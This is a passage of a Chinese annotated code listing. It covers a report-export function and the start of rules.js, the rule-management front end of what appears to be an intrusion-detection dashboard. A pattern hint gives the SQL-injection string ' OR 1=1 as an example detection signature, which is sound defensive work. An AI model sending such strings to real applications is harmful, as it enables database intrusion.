| 451 | 注释：说明前端逻辑或交互意图。 | `    // 把报告主体 + 关键样式打成一个自包含 HTML` |
| 452 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const report = document.getElementById("report-root");` |
| 453 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!report) return;` |
| 454 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const theme = document.querySelector('link[href*="theme.css"]');` |
| 455 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const components = document.querySelector('link[href*="components.css"]');` |
| 456 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const reportsCss = document.querySelector('link[href*="reports.css"]');` |
| 457 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const links = [theme, components, reportsCss]` |
| 458 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .filter(Boolean)` |
| 459 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      .map((n) => \`<link rel="stylesheet" href="${n.href}" />\`)` |
| 460 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      .join("\n");` |
| 461 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 462 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const html = \`<!DOCTYPE html>` |
| 463 | 前端语句：驱动页面交互、状态管理或数据展示。 | `<html lang="zh-CN" data-theme="report">` |
| 464 | 前端语句：驱动页面交互、状态管理或数据展示。 | `<head>` |
| 465 | 前端语句：驱动页面交互、状态管理或数据展示。 | `<meta charset="UTF-8" />` |
| 466 | 页面更新：修改元素内容、样式或状态。 | `<title>${escapeHtml(el.coverTitle.textContent)}</title>` |
| 467 | 前端语句：驱动页面交互、状态管理或数据展示。 | `${links}` |
| 468 | 前端语句：驱动页面交互、状态管理或数据展示。 | `<style>body{margin:0;padding:24px;background:#fff;color:#111827}</style>` |
| 469 | 前端语句：驱动页面交互、状态管理或数据展示。 | `</head>` |
| 470 | 前端语句：驱动页面交互、状态管理或数据展示。 | `<body>` |
| 471 | 前端语句：驱动页面交互、状态管理或数据展示。 | `${report.outerHTML}` |
| 472 | 前端语句：驱动页面交互、状态管理或数据展示。 | `</body>` |
| 473 | 前端语句：驱动页面交互、状态管理或数据展示。 | `</html>\`;` |
| 474 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const blob = new Blob([html], { type: "text/html;charset=utf-8" });` |
| 475 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    triggerDownload(blob, \`report-${state.period}-${stampNow()}.html\`);` |
| 476 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 477 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 478 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 479 | 注释：说明前端逻辑或交互意图。 | `   * 启动` |
| 480 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 481 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function init() {` |
| 482 | 注释：说明前端逻辑或交互意图。 | `    // 兜底：若 base.html 没挂 data-theme，也强制浅色` |
| 483 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (document.documentElement.getAttribute("data-theme") !== "report") {` |
| 484 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      document.documentElement.setAttribute("data-theme", "report");` |
| 485 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 486 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    bindHandlers();` |
| 487 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    await loadSummary();` |
| 488 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 489 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 490 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (document.readyState === "loading") {` |
| 491 | 事件绑定：监听用户操作并触发对应处理函数。 | `    document.addEventListener("DOMContentLoaded", init);` |
| 492 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  } else {` |
| 493 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    init();` |
| 494 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 495 | 前端语句：驱动页面交互、状态管理或数据展示。 | `})();` |

## `web/static/js/rules.js`

- 类型：前端静态资源
- 行数：773

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 注释：说明前端逻辑或交互意图。 | `/*` |
| 2 | 注释：说明前端逻辑或交互意图。 | ` * rules.js — 规则管理控制器（Phase 7，DESIGN.md §8.4）` |
| 3 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 4 | 注释：说明前端逻辑或交互意图。 | ` * 职责：` |
| 5 | 注释：说明前端逻辑或交互意图。 | ` *   1. 加载规则表格，支持 type / enabled / q 筛选` |
| 6 | 注释：说明前端逻辑或交互意图。 | ` *   2. 新建 / 编辑抽屉：前端表单校验 + 与后端 /api/rules 对齐` |
| 7 | 注释：说明前端逻辑或交互意图。 | ` *   3. 行内启用开关：PATCH /api/rules/<id>/toggle` |
| 8 | 注释：说明前端逻辑或交互意图。 | ` *   4. 删除：DELETE /api/rules/<id>，带 confirm` |
| 9 | 注释：说明前端逻辑或交互意图。 | ` *   5. 内嵌测试终端：POST /api/rules/test（支持 rule_id 或当前编辑中的草稿）` |
| 10 | 注释：说明前端逻辑或交互意图。 | ` *` |
| 11 | 注释：说明前端逻辑或交互意图。 | ` * 所有网络调用统一走 window.AGApi.fetchApi。` |
| 12 | 注释：说明前端逻辑或交互意图。 | ` */` |
| 13 | 前端语句：驱动页面交互、状态管理或数据展示。 | `(function () {` |
| 14 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  "use strict";` |
| 15 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 16 | 条件判断：根据页面状态或数据决定执行路径。 | `  if (!window.AGApi) return;` |
| 17 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { fetchApi } = window.AGApi;` |
| 18 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const { escapeHtml, formatTime, toast } = window.AGUI;` |
| 19 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 20 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const RULE_TYPES = ["signature", "threshold", "anomaly"];` |
| 21 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const RULE_ACTIONS = ["alert", "block", "monitor"];` |
| 22 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const RULE_LEVELS = ["low", "medium", "high", "critical"];` |
| 23 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const TYPE_LABEL = {` |
| 24 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    signature: "特征",` |
| 25 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    threshold: "阈值",` |
| 26 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    anomaly: "异常",` |
| 27 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 28 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const LEVEL_LABEL = {` |
| 29 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    low: "LOW",` |
| 30 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    medium: "MEDIUM",` |
| 31 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    high: "HIGH",` |
| 32 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    critical: "CRITICAL",` |
| 33 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 34 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const ACTION_LABEL = {` |
| 35 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    alert: "ALERT",` |
| 36 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    block: "BLOCK",` |
| 37 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    monitor: "MONITOR",` |
| 38 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 39 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const PATTERN_HINTS = {` |
| 40 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    signature:` |
| 41 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '子串匹配，如 \' OR 1=1；若用 /pattern/ 形式则按正则匹配（需合法 Python 正则）',` |
| 42 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    threshold:` |
| 43 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '表达式：<feature> <op> <number>，op ∈ >,>=,<,<=,==,!=；feature ∈ packets_per_sec, avg_packet_size, unique_ports, failed_ratio, payload_entropy, confidence',` |
| 44 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    anomaly:` |
| 45 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '逗号分隔的特征名，如 packets_per_sec,failed_ratio；命中条件：这些特征偏离预设常识区间',` |
| 46 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 47 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 48 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 49 | 注释：说明前端逻辑或交互意图。 | `   * 状态` |
| 50 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 51 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const state = {` |
| 52 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    type: "",` |
| 53 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    enabled: "",` |
| 54 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    q: "",` |
| 55 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    cache: new Map(), // id -> rule` |
| 56 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    editingId: null, // null 表示新建` |
| 57 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 58 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 59 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 60 | 注释：说明前端逻辑或交互意图。 | `   * DOM` |
| 61 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 62 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `  const el = {` |
| 63 | DOM 查询：定位页面元素以便读取或更新。 | `    tbody: document.getElementById("rules-tbody"),` |
| 64 | DOM 查询：定位页面元素以便读取或更新。 | `    countFiltered: document.getElementById("count-filtered"),` |
| 65 | DOM 查询：定位页面元素以便读取或更新。 | `    countTotal: document.getElementById("count-total"),` |
| 66 | DOM 查询：定位页面元素以便读取或更新。 | `    countEnabled: document.getElementById("count-enabled"),` |
| 67 | DOM 查询：定位页面元素以便读取或更新。 | `    activeChips: document.getElementById("active-chips"),` |
| 68 | DOM 查询：定位页面元素以便读取或更新。 | `    listStatus: document.getElementById("list-status"),` |
| 69 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 70 | DOM 查询：定位页面元素以便读取或更新。 | `    btnTypeGroup: document.querySelectorAll(".btn-group [data-type]"),` |
| 71 | DOM 查询：定位页面元素以便读取或更新。 | `    selEnabled: document.getElementById("filter-enabled"),` |
| 72 | DOM 查询：定位页面元素以便读取或更新。 | `    inputQ: document.getElementById("filter-query"),` |
| 73 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 74 | DOM 查询：定位页面元素以便读取或更新。 | `    btnRefresh: document.getElementById("btn-refresh"),` |
| 75 | DOM 查询：定位页面元素以便读取或更新。 | `    btnNew: document.getElementById("btn-new-rule"),` |
| 76 | DOM 查询：定位页面元素以便读取或更新。 | `    btnSeed: document.getElementById("btn-seed"),` |
| 77 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 78 | DOM 查询：定位页面元素以便读取或更新。 | `    drawer: document.getElementById("rule-drawer"),` |
| 79 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerOverlay: document.getElementById("drawer-overlay"),` |
| 80 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerClose: document.getElementById("drawer-close"),` |
| 81 | DOM 查询：定位页面元素以便读取或更新。 | `    drawerTitle: document.getElementById("drawer-title-text"),` |
| 82 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 83 | DOM 查询：定位页面元素以便读取或更新。 | `    fName: document.getElementById("f-name"),` |
| 84 | DOM 查询：定位页面元素以便读取或更新。 | `    eName: document.getElementById("e-name"),` |
| 85 | DOM 查询：定位页面元素以便读取或更新。 | `    fDescription: document.getElementById("f-description"),` |
| 86 | DOM 查询：定位页面元素以便读取或更新。 | `    fType: document.getElementById("f-type"),` |
| 87 | DOM 查询：定位页面元素以便读取或更新。 | `    fAction: document.getElementById("f-action"),` |
| 88 | DOM 查询：定位页面元素以便读取或更新。 | `    fLevel: document.getElementById("f-level"),` |
| 89 | DOM 查询：定位页面元素以便读取或更新。 | `    fPriority: document.getElementById("f-priority"),` |
| 90 | DOM 查询：定位页面元素以便读取或更新。 | `    fPattern: document.getElementById("f-pattern"),` |
| 91 | DOM 查询：定位页面元素以便读取或更新。 | `    ePattern: document.getElementById("e-pattern"),` |
| 92 | DOM 查询：定位页面元素以便读取或更新。 | `    fPatternHint: document.getElementById("f-pattern-hint"),` |
| 93 | DOM 查询：定位页面元素以便读取或更新。 | `    fEnabled: document.getElementById("f-enabled"),` |
| 94 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 95 | DOM 查询：定位页面元素以便读取或更新。 | `    tPayload: document.getElementById("t-payload"),` |
| 96 | DOM 查询：定位页面元素以便读取或更新。 | `    tSrcIp: document.getElementById("t-src-ip"),` |
| 97 | DOM 查询：定位页面元素以便读取或更新。 | `    tFeatures: document.getElementById("t-features"),` |
| 98 | DOM 查询：定位页面元素以便读取或更新。 | `    tTerminal: document.getElementById("t-terminal"),` |
| 99 | DOM 查询：定位页面元素以便读取或更新。 | `    tInput: document.getElementById("t-input"),` |
| 100 | DOM 查询：定位页面元素以便读取或更新。 | `    tRun: document.getElementById("t-run"),` |
| 101 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 102 | DOM 查询：定位页面元素以便读取或更新。 | `    btnSave: document.getElementById("btn-drawer-save"),` |
| 103 | DOM 查询：定位页面元素以便读取或更新。 | `    btnCancel: document.getElementById("btn-drawer-cancel"),` |
| 104 | DOM 查询：定位页面元素以便读取或更新。 | `    btnDelete: document.getElementById("btn-drawer-delete"),` |
| 105 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  };` |
| 106 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 107 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 108 | 注释：说明前端逻辑或交互意图。 | `   * 工具` |
| 109 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 110 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function debounce(fn, wait) {` |
| 111 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    let t = null;` |
| 112 | 返回结果：把计算值交给调用方。 | `    return function debounced(...args) {` |
| 113 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      clearTimeout(t);` |
| 114 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      t = setTimeout(() => fn.apply(null, args), wait);` |
| 115 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 116 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 117 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 118 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function typeBadge(type) {` |
| 119 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const safe = RULE_TYPES.includes(type) ? type : "signature";` |
| 120 | 返回结果：把计算值交给调用方。 | `    return (` |
| 121 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="badge badge--' +` |
| 122 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      safe +` |
| 123 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 124 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml((TYPE_LABEL[safe] \|\| safe).toUpperCase()) +` |
| 125 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 126 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 127 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 128 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 129 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function levelBadge(level) {` |
| 130 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const safe = RULE_LEVELS.includes(level) ? level : "low";` |
| 131 | 返回结果：把计算值交给调用方。 | `    return (` |
| 132 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="badge badge--' +` |
| 133 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      safe +` |
| 134 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 135 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(LEVEL_LABEL[safe] \|\| safe.toUpperCase()) +` |
| 136 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 137 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 138 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 139 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 140 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function actionBadge(action) {` |
| 141 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const safe = RULE_ACTIONS.includes(action) ? action : "alert";` |
| 142 | 返回结果：把计算值交给调用方。 | `    return (` |
| 143 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="badge badge--action-' +` |
| 144 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      safe +` |
| 145 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 146 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(ACTION_LABEL[safe] \|\| safe.toUpperCase()) +` |
| 147 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 148 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 149 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 150 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 151 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 152 | 注释：说明前端逻辑或交互意图。 | `   * 渲染` |
| 153 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 154 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderCounts(items) {` |
| 155 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const totalFiltered = items.length;` |
| 156 | 页面更新：修改元素内容、样式或状态。 | `    el.countFiltered.textContent = String(totalFiltered);` |
| 157 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 158 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 159 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshGlobalCounts() {` |
| 160 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 161 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const totalItems = await fetchApi("/api/rules");` |
| 162 | 页面更新：修改元素内容、样式或状态。 | `      el.countTotal.textContent = String(totalItems.length \|\| 0);` |
| 163 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const enabledItems = await fetchApi("/api/rules", {` |
| 164 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        query: { enabled: "true" },` |
| 165 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 166 | 页面更新：修改元素内容、样式或状态。 | `      el.countEnabled.textContent = String(enabledItems.length \|\| 0);` |
| 167 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 168 | 注释：说明前端逻辑或交互意图。 | `      // 计数失败不阻断主流程` |
| 169 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 170 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 171 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 172 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderTable(items) {` |
| 173 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!items \|\| items.length === 0) {` |
| 174 | 页面更新：修改元素内容、样式或状态。 | `      el.tbody.innerHTML =` |
| 175 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<tr><td colspan="10" class="alert-list__empty">' +` |
| 176 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state">' +` |
| 177 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state__title">当前筛选下暂无规则</div>' +` |
| 178 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<div class="empty-state__hint">点右上「新建规则」或「生成演示规则」</div>' +` |
| 179 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "</div></td></tr>";` |
| 180 | 返回结果：把计算值交给调用方。 | `      return;` |
| 181 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 182 | 页面更新：修改元素内容、样式或状态。 | `    el.tbody.innerHTML = items.map(renderRow).join("");` |
| 183 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 184 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 185 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderRow(rule) {` |
| 186 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const id = rule.id \|\| "";` |
| 187 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const enabled = !!rule.enabled;` |
| 188 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const rowClass = enabled ? "" : " table__row--disabled";` |
| 189 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const name = escapeHtml(rule.name \|\| "（未命名）");` |
| 190 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const description = escapeHtml(rule.description \|\| "");` |
| 191 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const pattern = escapeHtml(rule.pattern \|\| "");` |
| 192 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const updated = escapeHtml(formatTime(rule.updated_at));` |
| 193 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const priority = Number.isInteger(rule.priority) ? rule.priority : 100;` |
| 194 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const hits = Number.isInteger(rule.hits) ? rule.hits : 0;` |
| 195 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 196 | 返回结果：把计算值交给调用方。 | `    return (` |
| 197 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<tr data-id="' +` |
| 198 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(id) +` |
| 199 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '" class="rule-row' +` |
| 200 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      rowClass +` |
| 201 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 202 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<td class="center">' +` |
| 203 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<label class="switch">' +` |
| 204 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<input type="checkbox" data-action="toggle"' +` |
| 205 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (enabled ? " checked" : "") +` |
| 206 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ' aria-label="启用/禁用" />' +` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="switch__track"></span>' +` |
| 208 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="switch__thumb"></span>' +` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</label>" +` |
| 210 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 211 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "<td>" +` |
| 212 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div style="color: var(--text-primary)">' +` |
| 213 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      name +` |
| 214 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 215 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (description` |
| 216 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? '<div class="text-tertiary" style="font-size: var(--fs-caption); margin-top: 2px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 360px">' +` |
| 217 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          description +` |
| 218 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          "</div>"` |
| 219 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "") +` |
| 220 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 221 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "<td>" +` |
| 222 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      typeBadge(rule.type) +` |
| 223 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 224 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<td><code class="table__cell-pattern" title="' +` |
| 225 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pattern +` |
| 226 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '">' +` |
| 227 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      pattern +` |
| 228 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</code></td>" +` |
| 229 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "<td>" +` |
| 230 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      actionBadge(rule.action) +` |
| 231 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 232 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "<td>" +` |
| 233 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      levelBadge(rule.level) +` |
| 234 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<td class="num">' +` |
| 236 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      priority +` |
| 237 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 238 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<td class="num">' +` |
| 239 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      hits +` |
| 240 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<td class="mono" style="color: var(--text-tertiary); font-size: var(--fs-caption)">' +` |
| 242 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      updated +` |
| 243 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</td>" +` |
| 244 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<td><div class="table__actions">' +` |
| 245 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<button class="btn btn--ghost btn--sm" data-action="test" type="button">测试</button>' +` |
| 246 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<button class="btn btn--ghost btn--sm" data-action="edit" type="button">编辑</button>' +` |
| 247 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<button class="btn btn--danger btn--sm" data-action="delete" type="button">删除</button>' +` |
| 248 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div></td>" +` |
| 249 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</tr>"` |
| 250 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 251 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 252 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 253 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderChips() {` |
| 254 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const chips = [];` |
| 255 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.type) chips.push(chip("类型：" + (TYPE_LABEL[state.type] \|\| state.type), "type"));` |
| 256 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.enabled !== "")` |
| 257 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      chips.push(chip("状态：" + (state.enabled === "true" ? "启用" : "禁用"), "enabled"));` |
| 258 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.q) chips.push(chip('"' + state.q + '"', "q"));` |
| 259 | 页面更新：修改元素内容、样式或状态。 | `    el.activeChips.innerHTML = chips.join("");` |
| 260 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 261 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 262 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function chip(label, key) {` |
| 263 | 返回结果：把计算值交给调用方。 | `    return (` |
| 264 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="chip">' +` |
| 265 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(label) +` |
| 266 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<button class="chip__close" type="button" data-clear="' +` |
| 267 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      key +` |
| 268 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '" aria-label="清除">×</button>' +` |
| 269 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 270 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 271 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 272 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 273 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
